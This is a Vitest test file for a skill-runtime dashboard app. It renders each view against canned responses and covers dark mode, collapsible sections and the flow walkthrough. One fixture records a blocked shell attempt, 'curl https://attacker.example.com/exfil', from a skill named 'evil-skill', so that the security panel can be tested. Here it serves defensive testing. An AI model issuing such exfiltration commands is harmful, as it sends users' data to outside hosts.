// @vitest-environment happy-dom
import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { readFileSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = join(__dirname, "..");
const SPA_DIR = join(REPO_ROOT, "src/dashboard/spa");

/**
 * v0.19.3 — real SPA render coverage. Closes the gap surfaced by v0.19.2:
 * v0.18.9 shipped `app.js` with TS-style `arr[idx]!` non-null assertions
 * that triggered a browser SyntaxError → entire SPA never executed →
 * menu visible, contents blank. The bug shipped through THREE releases
 * (v0.18.9 / v0.19.0 / v0.19.1) because:
 *
 *   - TypeScript compiler accepts the syntax (TS-valid)
 *   - Unit tests didn't load app.js in a JS runtime
 *   - Build script copies src/dashboard/spa/* verbatim to dist
 *   - Live probes were CLI-side; SPA was never opened in a browser
 *
 * This test suite loads app.js into a happy-dom environment (real JS
 * runtime, real DOM, mocked fetch), triggers refresh + view changes,
 * and asserts the rendered HTML per view. Catches:
 *
 *   - Any JS runtime error during load or render
 *   - Render output that doesn't populate the main element
 *   - State-shape misreads (response format mismatches)
 *   - Missing event handlers
 *   - DOM expectation drift
 *
 * Future SPA additions extend this file; the test infrastructure
 * (mockFetch helpers + canned MCP responses) is the persistent
 * surface. v0.18.9's regression would have failed `loads without
 * syntax error` immediately.
 */

// ────────────────────────────────────────────────────────────────────────
// Canned MCP responses — represent the SPA's expected /rpc results
// ────────────────────────────────────────────────────────────────────────

const CANNED_CATALOG = {
  receives: [
    { name: "morning-brief", category: "augmenting", description: "Brief", status: "Approved", vars: [], output: [{ kind: "agent", target: "scott" }], triggers: [{ kind: "cron", expression: "0 9 * * *" }] },
  ],
  skills: [
    { name: "hello", category: "template", description: "Hello world", status: "Approved", vars: [], output: [], triggers: [] },
  ],
  headless: [
    { name: "heartbeat", category: "headless", description: "Heartbeat", status: "Approved", vars: [], output: [{ kind: "text" }], triggers: [{ kind: "cron", expression: "*/5 * * * *" }] },
  ],
};

const CANNED_TRIGGERS = [
  { id: "trig-1", skillName: "heartbeat", source: "cron", name: "*/5 * * * *", declarative: true, registeredAt: 1779000000, enabled: true },
];

const CANNED_METRICS = {
  totalFires: 12,
  totalErrors: 1,
  perSkill: {
    "heartbeat": { fireCount: 12, successCount: 11, errorCount: 1, successRate: 0.917, errorCategories: {} },
  },
  perConnector: {},
};

const CANNED_CAPABILITIES = {
  runtimeVersion: "0.19.3",
  mcpConnectors: [],
  mcpConnectorClasses: [],
  localModels: [],
  dataStores: [],
  skillStores: [{ name: "primary", implementation: "FilesystemSkillStore", contract_version: "1.0.0" }],
  agentConnectors: [],
};

const CANNED_BLOCKED_SHELL_ATTEMPTS = {
  attempts: [
    {
      skill_name: "evil-skill",
      target: "fetch",
      binary: "curl",
      body: "curl https://attacker.example.com/exfil",
      fired_at_ms: 1779000000000,
    },
  ],
  total: 1,
};

// Routing table — maps tool name to canned response
const CANNED_TOOLS: Record<string, unknown> = {
  skill_list: CANNED_CATALOG,
  list_triggers: CANNED_TRIGGERS,
  health_metrics: CANNED_METRICS,
  runtime_capabilities: CANNED_CAPABILITIES,
  blocked_shell_attempts: CANNED_BLOCKED_SHELL_ATTEMPTS,
};

// ────────────────────────────────────────────────────────────────────────
// Test fixture — load index.html + app.js into happy-dom; mock fetch
// ────────────────────────────────────────────────────────────────────────

interface SpaFixture {
  document: Document;
  triggerRefresh: () => Promise<void>;
  navigateTo: (hash: string) => Promise<void>;
}

async function loadSpa(toolOverrides: Partial<Record<string, unknown>> = {}): Promise<SpaFixture> {
  // happy-dom is configured via @vitest-environment header; window + document
  // are already global in this test file. Reset to a clean DOM each test.
  document.documentElement.innerHTML = readFileSync(join(SPA_DIR, "index.html"), "utf8")
    .replace(/<script[^>]*>[\s\S]*?<\/script>/g, ""); // strip script tag; we'll eval app.js manually

  // Mock fetch to route /rpc tools/call to canned responses.
  const toolMap: Record<string, unknown> = { ...CANNED_TOOLS, ...toolOverrides };
  (globalThis as unknown as { fetch: typeof fetch }).fetch = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
    if (!url.endsWith("/rpc")) {
      return new Response("not found", { status: 404 });
    }
    const body = init?.body !== undefined ? JSON.parse(init.body as string) as { method: string; id: number; params?: { name?: string; arguments?: { filter?: { status?: string } } } } : { method: "", id: 0 };
    if (body.method === "tools/call") {
      const toolName = body.params?.name;
      // v0.20.2 — the SPA poll now calls skill_list per-status (Draft/Approved/
      // Disabled). The canned skills are Approved, so only the Approved call
      // returns them; Draft/Disabled return empty (else state.skills triples).
      if (toolName === "skill_list" && toolOverrides["skill_list"] === undefined) {
        const status = body.params?.arguments?.filter?.status;
        const cat = status === undefined || status === "Approved" ? CANNED_CATALOG : { receives: [], skills: [], headless: [] };
        return new Response(JSON.stringify({ jsonrpc: "2.0", id: body.id, result: { content: [{ type: "text", text: JSON.stringify(cat) }] } }), { status: 200, headers: { "content-type": "application/json" } });
      }
      if (toolName !== undefined && toolName in toolMap) {
        return new Response(JSON.stringify({
          jsonrpc: "2.0",
          id: body.id,
          result: { content: [{ type: "text", text: JSON.stringify(toolMap[toolName]) }] },
        }), { status: 200, headers: { "content-type": "application/json" } });
      }
      // Unknown tool — emulate MCP error
      return new Response(JSON.stringify({
        jsonrpc: "2.0",
        id: body.id,
        error: { code: -32601, message: `Tool '${toolName}' not found` },
      }), { status: 200, headers: { "content-type": "application/json" } });
    }
    return new Response("bad request", { status: 400 });
  }) as unknown as typeof fetch;

  // Load + execute app.js in this happy-dom context. Strip auto-start
  // (DOMContentLoaded + hashchange wiring) because we manually trigger
  // refresh + hashchange for deterministic test control. The functions
  // are module-scoped — make them callable from the test by hoisting
  // a few onto window before eval.
  const appJsRaw = readFileSync(join(SPA_DIR, "app.js"), "utf8");
  // Append a tail that exposes the entry points + state for inspection.
  const appJs = appJsRaw + `
;
// v0.19.3 test hook — expose private functions so the test runtime can
// drive refresh + view changes deterministically without waiting on
// DOMContentLoaded.
window.__spaTest = {
  refresh,
  renderCurrentView,
  state,
};
`;
  // Wrap in a function expression so the module's top-level code runs
  // exactly once with access to the live document/window.
  const fn = new Function(appJs);
  fn();
  const hooks = (window as unknown as { __spaTest: { refresh: () => Promise<void>; renderCurrentView: () => Promise<void> } }).__spaTest;

  return {
    document,
    triggerRefresh: async () => { await hooks.refresh(); },
    navigateTo: async (hash: string) => {
      window.location.hash = hash;
      await hooks.renderCurrentView();
    },
  };
}

// ────────────────────────────────────────────────────────────────────────
// Smoke: app.js loads + executes without throwing
// ────────────────────────────────────────────────────────────────────────

describe("v0.19.3 — SPA loads without runtime errors (the v0.18.9 regression that escaped)", () => {
  it("app.js executes in a JS runtime + exposes its entry points (the exact gap v0.18.9 missed)", async () => {
    const fixture = await loadSpa();
    expect(fixture.document.getElementById("main")).not.toBeNull();
    expect(fixture.document.getElementById("nav")).not.toBeNull();
  });

  it("refresh + first render produces non-empty main content (would have caught v0.18.9 blank-content symptom)", async () => {
    const fixture = await loadSpa();
    await fixture.triggerRefresh();
    const main = fixture.document.getElementById("main");
    expect(main).not.toBeNull();
    expect(main!.innerHTML.length).toBeGreaterThan(50); // any real content; not empty/whitespace
  });
});

// ────────────────────────────────────────────────────────────────────────
// Per-view render coverage
// ────────────────────────────────────────────────────────────────────────

describe("v0.19.3 — each top-nav view renders non-empty content with canned state", () => {
  it("#overview renders KPI surface with skill + trigger counts", async () => {
    const fixture = await loadSpa();
    await fixture.triggerRefresh();
    await fixture.navigateTo("#overview");
    const html = fixture.document.getElementById("main")!.innerHTML;
    expect(html).toContain("12"); // totalFires from canned metrics
    // Catalog has 3 skills (1 receives + 1 skills + 1 headless)
    expect(html).toMatch(/3/);
  });

  it("#skills renders the catalog list", async () => {
    const fixture = await loadSpa();
    await fixture.triggerRefresh();
    await fixture.navigateTo("#skills");
    const html = fixture.document.getElementById("main")!.innerHTML;
    expect(html).toContain("heartbeat");
    expect(html).toContain("hello");
    expect(html).toContain("morning-brief");
  });

  it("#triggers renders the registered triggers", async () => {
    const fixture = await loadSpa();
    await fixture.triggerRefresh();
    await fixture.navigateTo("#triggers");
    const html = fixture.document.getElementById("main")!.innerHTML;
    expect(html).toContain("heartbeat");
    expect(html).toContain("*/5 * * * *");
  });

  it("#connectors renders the wired-substrate surface", async () => {
    const fixture = await loadSpa();
    await fixture.triggerRefresh();
    await fixture.navigateTo("#connectors");
    const html = fixture.document.getElementById("main")!.innerHTML;
    expect(html).toContain("FilesystemSkillStore");
  });

  it("#security renders the blocked-shell-attempts panel (v0.18.9 surface)", async () => {
    const fixture = await loadSpa();
    await fixture.triggerRefresh();
    await fixture.navigateTo("#security");
    const html = fixture.document.getElementById("main")!.innerHTML;
    expect(html).toContain("curl");
    expect(html).toContain("evil-skill");
  });

  it("unknown hash falls through to empty-state", async () => {
    const fixture = await loadSpa();
    await fixture.triggerRefresh();
    await fixture.navigateTo("#bogus-view");
    const html = fixture.document.getElementById("main")!.innerHTML;
    expect(html).toContain("Unknown view");
  });
});

// ────────────────────────────────────────────────────────────────────────
// Graceful-degradation surfaces (operator running pre-v0.18.9 runtime)
// ────────────────────────────────────────────────────────────────────────

describe("v0.19.3 — graceful degradation against missing MCP tools", () => {
  it("#security degrades when blocked_shell_attempts tool isn't available", async () => {
    // Simulate pre-v0.18.9 runtime: blocked_shell_attempts returns
    // unknown-tool error (which the SPA catches and treats as null).
    const fixture = await loadSpa({ blocked_shell_attempts: undefined });
    await fixture.triggerRefresh();
    await fixture.navigateTo("#security");
    const html = fixture.document.getElementById("main")!.innerHTML;
    expect(html).toContain("unavailable");
  });
});

// ────────────────────────────────────────────────────────────────────────
// State-shape regression guard: skill detail with security signals
// ────────────────────────────────────────────────────────────────────────

describe("v0.19.3 — skill detail renders v0.18.9 security signals + highlighting (the broken surface)", () => {
  it("collectSecuritySignals + renderHighlightedSkillBody execute without error on a real skill body", async () => {
    // Add skill_preflight + skill_read responses for the detail view.
    const detailToolMap = {
      skill_preflight: {
        metadata: { name: "risky-skill", description: "demo", status: "Approved" },
        versions: [{ version: "abc123", status: "Approved", changed_at: 1779000000, content_hash: "abc123" }],
        recent_fires: [],
        approval: { gate_ok: true },
      },
      skill_read: {
        name: "risky-skill",
        version: "abc123",
        status: "Approved",
        source: `# Skill: risky-skill\n# Status: Approved\n# Autonomous: true\n# Triggers: cron: 0 * * * *\nm:\n    shell(command="curl https://api.example.com") -> R\n    shell(command="echo $R | jq", unsafe=true) -> S\n    $ data_write content="\${S}" approved="autonomous"\ndefault: m\n`,
      },
    };
    const fixture = await loadSpa(detailToolMap);
    await fixture.triggerRefresh();
    await fixture.navigateTo("#skill/risky-skill");
    const html = fixture.document.getElementById("main")!.innerHTML;
    // Security signals panel renders (would have thrown SyntaxError pre-v0.19.2)
    expect(html).toContain("Security signals");
    // Highlighting wrapper applied to shell calls
    expect(html).toContain("sig-medium");
    // Highlighting wrapper applied to high-severity tokens
    expect(html).toContain("sig-high");
    // Aggregated counts mention shell ops
    expect(html).toMatch(/shell op/);

    // Regression: the single-capture-group HIGH patterns must NOT leak the
    // match OFFSET into the rendered body (String.replace's 3rd callback arg
    // is the offset, a number — not a capture group). Pre-fix this rendered
    // `$ data_write<span class="sig-high">2861</span>` and
    // `approved=&quot;autonomous&quot;<span ...>3021</span>`.
    // NB: read from innerHTML, so `&quot;` is re-serialized back to a bare `"`
    // in text content (quotes only need escaping in attributes).
    const sourceBlock = html.slice(html.indexOf("skill-source"));
    // The signal text itself must be inside the span, not a bare number.
    expect(sourceBlock).toContain(`<span class="sig-high">$ data_write</span>`);
    expect(sourceBlock).toContain(`<span class="sig-high">approved="autonomous"</span>`);
    // And no digit may sit immediately after a mutation op or a closing
    // approved quote in the highlighted source.
    expect(sourceBlock).not.toMatch(/data_write\d/);
    expect(sourceBlock).not.toMatch(/approved="[^"]*"\d/);
  });

  it("v0.21.0 — the effectful-footprint approver checklist renders from skill_preflight's contract", async () => {
    const detailToolMap = {
      skill_preflight: {
        metadata: { name: "gather", description: "demo", status: "Draft" },
        versions: [],
        recent_fires: [],
        approval: { gate_ok: false, reason: "Draft" },
        contract: {
          vars: ["AREA"],
          returns: ["SUMMARY"],
          requires: [],
          effectful_footprint: {
            connectors: ["youtrack"], builtins: ["data_write"], shell_binaries: ["curl"],
            unsafe_shell: 0, file_writes: 1, file_reads: 0, notifies: 0,
          },
        },
      },
      skill_read: { name: "gather", version: "v", status: "Draft", source: "# Skill: gather\n# Status: Draft\nrun:\n    emit(text=\"x\")\ndefault: run\n" },
    };
    const fixture = await loadSpa(detailToolMap);
    await fixture.triggerRefresh();
    await fixture.navigateTo("#skill/gather");
    const html = fixture.document.getElementById("main")!.innerHTML;
    expect(html).toContain("What this skill touches");
    expect(html).toContain("youtrack");   // connector
    expect(html).toContain("data_write"); // builtin
    expect(html).toContain("curl");       // shell binary
    expect(html).toMatch(/file_write/);   // file write op
  });

  it("v0.21.0 — a pure skill shows the 'nothing effectful to authorize' footprint", async () => {
    const detailToolMap = {
      skill_preflight: {
        metadata: { name: "pure", description: "demo", status: "Approved" },
        versions: [], recent_fires: [], approval: { gate_ok: true },
        contract: {
          vars: [], returns: [], requires: [],
          effectful_footprint: { connectors: [], builtins: [], shell_binaries: [], unsafe_shell: 0, file_writes: 0, file_reads: 0, notifies: 0 },
        },
      },
      skill_read: { name: "pure", version: "v", status: "Approved", source: "# Skill: pure\n# Status: Approved\nt:\n    emit(text=\"hi\")\ndefault: t\n" },
    };
    const fixture = await loadSpa(detailToolMap);
    await fixture.triggerRefresh();
    await fixture.navigateTo("#skill/pure");
    const html = fixture.document.getElementById("main")!.innerHTML;
    expect(html).toContain("What this skill touches");
    expect(html).toContain("Nothing effectful to authorize");
  });
});

// ────────────────────────────────────────────────────────────────────────
// Dark mode (Phase 1 of the non-programmer-approver dashboard arc). The
// theme is a CSS-variable palette toggled via `data-theme` on <html>. These
// guard the three moving parts so a future edit can't silently unwire it:
// the no-flash init + toggle button (index.html), the light+dark palettes
// (styles.css), and the toggle handler (app.js).
// ────────────────────────────────────────────────────────────────────────

describe("dark mode — theming machinery is wired across the SPA assets", () => {
  const indexHtml = readFileSync(join(SPA_DIR, "index.html"), "utf8");
  const stylesCss = readFileSync(join(SPA_DIR, "styles.css"), "utf8");
  const appJs = readFileSync(join(SPA_DIR, "app.js"), "utf8");

  it("index.html sets the theme before paint and exposes the toggle button", () => {
    // No-flash init: reads the stored/OS preference and stamps data-theme.
    expect(indexHtml).toMatch(/localStorage\.getItem\("skillscript-theme"\)/);
    expect(indexHtml).toMatch(/setAttribute\("data-theme"/);
    expect(indexHtml).toMatch(/id="theme-toggle"/);
  });

  it("styles.css defines a light :root palette and a dark override, both variable-driven", () => {
    expect(stylesCss).toMatch(/:root\s*\{/);
    expect(stylesCss).toMatch(/\[data-theme="dark"\]\s*\{/);
    // The palette is variables, not hardcoded colors, so surfaces theme from one place.
    expect(stylesCss).toMatch(/--bg:/);
    expect(stylesCss).toMatch(/background:\s*var\(--bg\)/);
    expect(stylesCss).toMatch(/color:\s*var\(--text\)/);
  });

  it("app.js wires the toggle to flip + persist the theme", () => {
    expect(appJs).toMatch(/function initThemeToggle\(/);
    expect(appJs).toMatch(/initThemeToggle\(\)/); // called on load
    expect(appJs).toMatch(/localStorage\.setItem\("skillscript-theme"/);
  });

  it("app.js no longer hardcodes inline hex colors (they are CSS variables now)", () => {
    // The pre-theme inline styles used hex like #6c757d / #e6e8eb; dark mode
    // requires them to be var(--…) so they invert with the palette.
    expect(appJs).not.toMatch(/(?:color|background):\s*#[0-9a-fA-F]{3,6}/);
  });
});

// ────────────────────────────────────────────────────────────────────────
// Collapsible review sections (Phase 2 of the non-programmer-approver arc).
// Firm principle: the approval-decision surface is NEVER hidden behind a
// click — Status, What this skill touches, Security signals, Source, and
// Composes-when-present stay open <section>s. Only telemetry/reference
// (Metrics, Recent fires, Version history, Triggers) collapses by default,
// via native <details>. Composes hides entirely when the skill composes
// nothing (no empty state to spend space on).
// ────────────────────────────────────────────────────────────────────────

describe("collapsible review sections — telemetry collapses, decision surface stays open", () => {
  const nonComposingDetail = {
    skill_preflight: {
      metadata: { name: "flow", description: "demo", status: "Approved" },
      versions: [{ version: "v1", status: "Approved", changed_at: 1779000000, content_hash: "v1" }],
      recent_fires: [],
      approval: { gate_ok: true },
      contract: {
        vars: [], returns: [], requires: [],
        effectful_footprint: { connectors: [], builtins: ["data_write"], shell_binaries: [], unsafe_shell: 0, file_writes: 0, file_reads: 0, notifies: 0 },
      },
    },
    skill_read: {
      name: "flow",
      version: "v1",
      status: "Approved",
      source: `# Skill: flow\n# Status: Approved\nm:\n    $ data_write content="x"\ndefault: m\n`,
    },
  };

  it("telemetry sections are collapsed <details>; decision surface stays open <section>", async () => {
    const fixture = await loadSpa(nonComposingDetail);
    await fixture.triggerRefresh();
    await fixture.navigateTo("#skill/flow");
    const doc = fixture.document;

    const collapsibles = [...doc.querySelectorAll("details.section.collapsible")];
    const summaries = collapsibles.map((d) => d.querySelector("summary")?.textContent?.trim() ?? "");

    // The four reference/telemetry sections collapse.
    expect(summaries).toContain("Metrics (24h)");
    expect(summaries.some((s) => s.startsWith("Recent fires"))).toBe(true);
    expect(summaries.some((s) => s.startsWith("Version history"))).toBe(true);
    expect(summaries.some((s) => s.startsWith("Triggers"))).toBe(true);

    // Collapsed BY DEFAULT — none carry the `open` attribute.
    expect(collapsibles.every((d) => !d.hasAttribute("open"))).toBe(true);

    // The decision surface is NOT collapsible — it renders as open <section>.
    const openHeads = [...doc.querySelectorAll("section > h2")].map((h) => h.textContent ?? "");
    expect(openHeads).toContain("Source");
    expect(openHeads.some((h) => h.includes("What this skill touches"))).toBe(true);
    // …and must never be hidden behind a summary.
    expect(summaries).not.toContain("Source");
    expect(summaries.some((s) => s.includes("What this skill touches"))).toBe(false);
  });

  it("Composes is hidden entirely when the skill composes nothing", async () => {
    const fixture = await loadSpa(nonComposingDetail);
    await fixture.triggerRefresh();
    await fixture.navigateTo("#skill/flow");
    const html = fixture.document.getElementById("main")!.innerHTML;
    // No "Composes" heading/summary and no empty-state placeholder for it.
    expect(html).not.toContain("Composes");
    expect(html).not.toContain("doesn't compose other skills");
  });
});

// ────────────────────────────────────────────────────────────────────────
// "What it does, step by step" walkthrough (Phase 3 of the non-programmer-
// approver arc). A plain-language flow drawn from skill_preflight's
// contract.flow — targets as lanes, ops as steps, in the open decision surface
// under "What this skill touches". Body-only skills (empty flow) show nothing.
// ────────────────────────────────────────────────────────────────────────

describe("control-flow walkthrough — plain-language flow in the review view", () => {
  const withFlow = (flow: unknown) => ({
    skill_preflight: {
      metadata: { name: "pipeline", description: "demo", status: "Approved" },
      versions: [{ version: "v1", status: "Approved", changed_at: 1779000000, content_hash: "v1" }],
      recent_fires: [],
      approval: { gate_ok: true },
      contract: {
        vars: [], returns: [], requires: [],
        effectful_footprint: { connectors: [], builtins: ["data_write"], shell_binaries: [], unsafe_shell: 0, file_writes: 0, file_reads: 0, notifies: 0 },
        flow,
      },
    },
    skill_read: { name: "pipeline", version: "v1", status: "Approved", source: `# Skill: pipeline\n# Status: Approved\nfetch:\n    $ data_write content="x"\ndefault: fetch\n` },
  });

  it("renders lanes + plain-language steps, marks the entry, tags mutations", async () => {
    const flow = {
      lanes: [
        { id: "fetch", isEntry: false, deps: [], steps: [
          { label: "Read from the data store", detail: "recent activity", tone: "external" },
          { label: "Run the greeting-helper skill", tone: "external", ref: { skill: "greeting-helper" } },
          { label: "Set a value", tone: "plumbing" },
        ] },
        { id: "publish", isEntry: true, deps: ["fetch"], steps: [{ label: "Write to the data store", tone: "mutation" }] },
      ],
      entry: "publish",
      truncated: false,
    };
    const fixture = await loadSpa(withFlow(flow));
    await fixture.triggerRefresh();
    await fixture.navigateTo("#skill/pipeline");
    const html = fixture.document.getElementById("main")!.innerHTML;
    expect(html).toContain("What it does, step by step");
    // An SVG flowchart with plain-language step rows carrying their key argument.
    expect(html).toContain("flow-svg");
    expect(html).toContain("Read from the data store");
    expect(html).toContain("recent activity");
    expect(html).toContain("Write to the data store");
    // Target boxes in a layered graph: the entry box (runs last) is emphasized
    // and flagged as the result.
    expect(html).toContain("flow-box");
    expect(html).toContain("flow-box-entry");
    expect(html).toContain("result");
    // Dependencies are shown as real arrows. Risk-first weighting: the mutation
    // gets a highlight band + bold, plumbing is recessed.
    expect(html).toContain("flow-arrow");
    expect(html).toContain("flow-band-mutation");
    expect(html).toContain("flow-row-mutation");
    expect(html).toContain("flow-row-plumbing");
    // A composed-skill step names it and links through to its review view.
    expect(html).toContain("Run the greeting-helper skill");
    expect(html).toContain('href="#skill/greeting-helper"');
  });

  it("shows no diagram for a body-only skill (empty flow)", async () => {
    const fixture = await loadSpa(withFlow({ lanes: [], entry: null, truncated: false }));
    await fixture.triggerRefresh();
    await fixture.navigateTo("#skill/pipeline");
    const html = fixture.document.getElementById("main")!.innerHTML;
    expect(html).not.toContain("What it does, step by step");
    expect(html).not.toContain("flow-svg");
  });
});
